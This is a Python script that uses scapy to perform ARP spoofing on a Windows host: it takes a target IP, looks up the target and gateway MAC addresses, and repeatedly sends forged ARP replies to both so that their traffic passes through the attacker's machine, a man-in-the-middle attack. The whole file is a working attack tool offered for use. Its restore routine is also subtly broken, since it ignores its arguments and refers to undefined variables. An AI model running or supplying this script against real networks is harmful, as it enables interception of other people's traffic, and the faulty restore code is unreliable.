#!python3
from socket import timeout
import scapy.all as sc
import sys,argparse
import time
import subprocess


# reference code:
# https://www.programcreek.com/python/example/103593/sc.all.srp

####################################################SETUP##################################################################

def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t","--target-ip",dest="tarIP",help="Enter a target IP.")
    options = parser.parse_args()
    return options


def getWinMac():
    pipecmd_gm = 'getmac /fo list /v | findstr "Address:"'
    mac = subprocess.check_output(pipecmd_gm, shell = True)
    macLst = (mac.split())
    mac = macLst[-1]
    mac = mac.decode()
    mac = mac.replace('-',':')
    return mac


def getGateway():
    pipecmdIP = 'ipconfig | findstr "Default Gateway"'
    cmd = subprocess.check_output(pipecmdIP,shell = True)
    cmd = cmd.split()
    mac = cmd[-1]
    mac = mac.decode()
    return mac


def getMac(address):
    request = sc.ARP(pdst = address)
    broadcast = sc.Ether(dst="ff:ff:ff:ff:ff:ff")
    broadcast.src = myMac  
    request_broadcast = broadcast/request        
    answered_list= sc.srp(request_broadcast,timeout = 5,verbose=False)[0]
    if len(answered_list) > 0:
        targetMac = answered_list[0][1].hwsrc
        print(f'\rConfirmed MAC address: {targetMac} for {address}.')
    else:
        print(f'\rNo ARP response from target, sending broadcast to {address}')
        targetMac = "ff:ff:ff:ff:ff:ff"
    return targetMac


def spoof(dstIP,dstMAC,srcIP,srcMAC):
    pkt = sc.ARP(op=2, pdst = dstIP, hwdst = dstMAC, psrc = srcIP, hwsrc = srcMAC)
    sc.send(pkt,verbose = False)


def restore(dstIP,dstMAC,srcIP,srcMAC):
    pkt = sc.ARP(op=2,pdst=tarIP,hwdst=tarMac,psrc=tarGateway,hwsrc=gatewayMac) 
    sc.send(pkt, count=4,verbose=False)

######################################################VAR#######################################################

opt = get_args()
myMac = getWinMac()
gatewayIP = getGateway()
targetMAC = getMac(opt.tarIP)
gatewayMAC = getMac(gatewayIP)
pktCounter = 0


print('Target IP: {}'.format(opt.tarIP))
print('Target MAC: {}'.format(targetMAC))
print('Gateway IP: {}'.format(gatewayIP))
print('Gateway MAC: {}'.format(gatewayMAC))
 
##################################################RUN#######################################################################

try:
    while True:
        spoof(opt.tarIP,targetMAC,gatewayIP,myMac)
        spoof(gatewayIP,gatewayMAC,opt.tarIP,myMac)
        pktCounter = pktCounter + 2
        print(f'\r[+] Packets sent: {pktCounter}',end='')
        time.sleep(2)


except Exception as e:
    print(f'\tError: {e}')
    sys.exit()


except KeyboardInterrupt:
    print('Abort\nRestoring ARP table')
    restore(opt.tarIP,targetMAC,gatewayIP,gatewayMAC)
    restore(gatewayIP,gatewayMAC,opt.tarIP,targetMAC)
    sys.exit()

